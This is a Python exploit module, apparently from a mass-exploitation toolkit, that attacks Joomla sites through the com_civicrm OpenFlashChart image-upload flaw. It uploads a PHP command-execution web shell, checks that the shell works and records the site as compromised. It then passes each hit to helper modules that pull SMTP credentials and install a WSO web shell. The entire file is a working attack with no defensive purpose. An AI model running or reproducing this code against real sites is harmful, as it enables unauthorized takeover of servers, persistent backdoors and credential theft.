# coding=utf-8
import requests
import printModule
import getSMTP
import wsoShellUploaderModule

payloadshell = '"neko!!<?php {});?>"'.format("system({}".format('$_GET["cmd"]'))
Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}


def Exploit(site):
    try:
        requests.post('http://' + site + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/'
                                         'php-ofc-library/ofc_upload_image.php?name=neko.php',
                      data=payloadshell, headers=Headers, timeout=10)
        Exp = requests.get('http://' + site + '/administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/'
                                              'tmp-upload-images/neko.php',
                           headers=Headers, timeout=10)
        if 'neko!!' in str(Exp.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/administrator/components/com_civicrm/civicrm/packages/'
                                    'OpenFlashChart/tmp-upload-images/neko.php?cmd=uname -a' + '\n')
                getSMTP.JooomlaSMTPshell(site + '/administrator/components/com_civicrm/civicrm/packages/'
                                                'OpenFlashChart/tmp-upload-images/neko.php?cmd=id')
                WSo = wsoShellUploaderModule.UploadWso(site + '/administrator/components/com_civicrm/civicrm/packages/'
                                                              'OpenFlashChart/tmp-upload-images/neko.php?cmd=id')
                if WSo == 'No':
                    pass
                else:
                    with open('result/WSo_Shell.txt', 'a') as Wr:
                        Wr.write('{}\n'.format(WSo))
            return printModule.returnYes(site, 'N/A', 'Com_civicrm', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'Com_civicrm', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'Com_civicrm', 'Joomla')
